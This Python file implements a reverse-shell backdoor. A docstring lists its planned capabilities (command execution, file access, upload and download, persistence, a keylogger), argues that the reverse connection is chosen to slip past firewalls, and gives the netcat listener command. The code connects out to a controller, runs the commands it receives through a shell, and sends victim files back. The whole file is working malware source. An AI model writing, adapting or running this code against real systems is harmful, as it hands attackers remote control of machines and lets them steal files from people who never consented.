"""
A simple backdoor program.

Reverse backdoor:
    Listening for incoming connections on a specific port
    1. Access file system
    2. Execute system commands
    3. Download files
    4. Upload files
    5. Persistence
    
Backdoor:
    Interactive program gives access to system its executed on.
        1. Command execution
        2. Access file system
        3. Upload/Download files
            - a file is a series of character
            - transfer a file we need to:
                a) read the file as a sequence of characters
                b) send this sequence of characters
                c) create a new emtpy file at destination
                d) store the transferred sequence of characters in the new file
        4. Run keylogger
        ...
 
Why do we use reverse connection:       
    1. Bind/Direct Connection is easy to be detected by the firewall 
    
Need to run following command in host machine to listen from incoming connection
    nc -vv -l -p 4444
"""
import os
import socket
import subprocess
import json


class Backdoor:
    """
    Backdoor program.
    """

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # (ip of destination, port opened in target)
        self.connection.connect((ip, port))
        # send data
        self.reliable_send("\n[+] Connection established.\n")

    def reliable_send(self, data):
        """
        Convert data into json data and send it.
        Use this custom send method instead of socket send method.

        :param data: data that we want to send 
        :type data: obj
        """
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        """
        Unwrap data into obj.
        Use this custom receive method instead of socket recv method.
        """
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        """
        Execute a system command.
    
        :param command: command that we want to execute
        :type command: str
        :return: resulting command 
        :rtype: str
        """
        return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        """
        Change the working directory to the path.
        :param path: the path that we want to change to
        :type path: str
        :return: message
        :rtype: str
        """
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        """
        Read a file from the path
        :param path: the path that contains the file we wanted to read
        :type path: str
        """
        with open(path, "rb") as file:
            return file.read()

    def run(self):
        """
        Run the backdoor program.
        """
        while True:
            command = self.reliable_receive()
            command_result = ""
            # exit command
            if command[0] == "exit":
                self.connection.close()
                exit()

            # cd command
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])

            # read file
            elif command[0] == "download" and len(command) > 1:
                command_result = self.read_file(command[1])

            # execute command
            else:
                command_result = self.execute_system_command(command)

            self.reliable_send(command_result)


if __name__ == "__main__":
    # TODO: set ip_address to local ip address
    ip_address = ""
    backdoor = Backdoor(ip_address, 4444)
    backdoor.run()
